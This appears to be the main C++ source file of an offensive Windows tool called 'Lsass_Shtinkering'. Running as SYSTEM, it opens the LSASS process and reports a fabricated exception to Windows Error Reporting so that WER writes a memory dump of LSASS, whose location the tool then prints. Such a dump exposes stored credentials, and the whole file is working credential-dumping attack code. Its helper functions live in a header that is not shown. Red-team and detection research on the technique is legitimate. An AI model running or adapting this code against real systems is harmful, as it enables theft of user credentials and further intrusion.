#include "Lsass_Shtinkering.h"

int main(int argc, char* argv[])
{

	DWORD processPid = GetCurrentProcessId();
	HANDLE processHandle;
	DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), GetCurrentProcess(), &processHandle, PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, TRUE, NULL);

	try
	{
		if (IsLocalSystem())
			wcout << L"process runs as NT AUTHORITY\\SYSTEM" << endl;
		else
		{
			wcout << L"process must run as NT AUTHORITY\\SYSTEM to dump lsass memory" << endl;
			return 0;
		}
		processPid = GetLsassPid();
		processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, TRUE, processPid);

		wcout << L"[*] Reporting exception on LSASS PID: 0x" << std::hex << processPid << endl;
		ReportExceptionToWer(processPid, processHandle);
		wcout << L"[V] Exception reported successfully!" << endl;
		PrintCrashDampLocation();
	}
	catch (std::exception& exception)
	{
		wcout << L"[X] Error: " << exception.what() << endl;
	}
	
}